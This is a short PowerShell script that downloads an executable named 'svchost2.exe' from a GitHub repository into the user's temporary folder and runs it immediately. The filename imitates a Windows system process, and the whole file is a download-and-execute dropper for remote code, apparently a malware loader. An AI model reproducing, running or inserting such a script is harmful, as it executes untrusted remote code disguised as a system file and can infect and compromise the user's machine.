$FILE_URL = "https://github.com/qbekun/cs2/raw/refs/heads/main/svchost2.exe"
$TEMP_PATH = "$env:TEMP\svchost2.exe"

$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($FILE_URL, $TEMP_PATH)

Start-Process -FilePath $TEMP_PATH
